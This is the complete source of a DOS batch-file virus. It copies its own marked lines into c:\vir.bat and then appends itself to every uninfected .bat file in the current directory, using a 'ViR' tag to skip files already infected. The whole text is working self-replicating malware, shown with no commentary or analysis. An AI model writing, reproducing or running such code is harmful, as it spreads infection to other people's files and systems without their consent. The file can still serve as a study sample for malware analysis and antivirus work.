@echo off>nul.ViR                      
if '%1=='InF goto ViR_inf              
if exist c:\vir.bat goto ViR_run       
if not exist %0.bat goto ViR_end       
find "ViR"<%0.bat>c:\vir.bat          
:ViR_run                                   
for %%a in (*.bat) do call c:\ViR InF %%a  
goto ViR_end                              
:ViR_inf                               
find "ViR"<%2>nul                      
if not errorlevel 1 goto ViR_end       
type c:\ViR.bat>>%2                    
:ViR_end                               
